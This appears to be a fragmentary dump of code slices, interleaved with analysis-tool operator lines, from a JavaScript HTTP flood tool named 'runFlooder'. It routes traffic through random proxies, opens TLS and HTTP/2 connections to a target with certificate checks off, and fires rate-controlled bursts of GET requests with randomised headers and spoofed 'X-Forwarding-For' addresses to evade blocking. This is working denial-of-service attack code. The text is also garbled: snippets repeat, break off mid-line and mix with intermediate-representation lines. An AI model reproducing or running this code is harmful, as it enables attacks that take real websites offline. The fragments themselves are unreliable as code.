const request = client.request(dynHeaders)

                        .on("response", response => {
                            const statusCode = response[':status'];

                            if (_log) {
                                const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];

                                if (_log === true) {
                                    if (httpStatusCodes[statusCode]) {
                                        log(`${statusCode} ${description}`)
                                    }
                                } else {
                                    if (httpStatusCodes[statusCode] && statusCode === parseInt(_log)) {
                                        log(`${statusCode} ${description}`)
                                    }
                                }
                            }


                            if (payload === '%RAND%') {
                           ...
headers["accept"] = accept
const statusCode = response[':status']
<operator>.formatString("", statusCode, " ", description, "")
function runFlooder = function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['http/1.1', 'h2'],
            sigals: "RSA+SHA256:ECDSA+SHA256",
            socket: connection,
            ecdhCurve: "auto",
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            s...
<operator>.formatString("", statusCode, " ", description, "")
request.write(randstr(25))
request.end()
Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['http/1.1', 'h2'],
            sigals: "RSA+SHA256:ECDSA+SHA256",
            socket: connection,
            ecdhCurve: "auto",
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
            session: crypto.randomBytes(64),
            timeout: 1000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const cl...
request.end()
connection.setKeepAlive(true, 600000)
var req = http.request({
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsedTarget.host + ":443"
    }, (err) => {
        req.end();
        return;
    })
req.on('connect', function (res, socket, head) {
        var tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket: socket
        }, function () {
            setInterval(() => {
                for (let j = 0; j < args.rate; j++) {
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ...
var tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket: socket
        }, function () {
            setInterval(() => {
                for (let j = 0; j < args.rate; j++) {
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
       ...
_tmp_33.socket = socket
const request = client.request(dynHeaders)
setInterval(() => {
                for (let j = 0; j < args.rate; j++) {
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}\r\n` +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n";

                    if (spoof) {
                        headers += `X-Forwarding-For: ${getRandomPrivateIP()}\r\n`;
...
let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}\r\n` +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n"
<operator>.formatString("Accept: ", randomElement(headerBuilder.accept), "\r\n")
<operator>.formatString("X-Forwarding-For: ", getRandomPrivateIP(), "\r\n")
headers += `\r\n`
dynHeaders = headers
tlsConnection.write(dynHeaders)
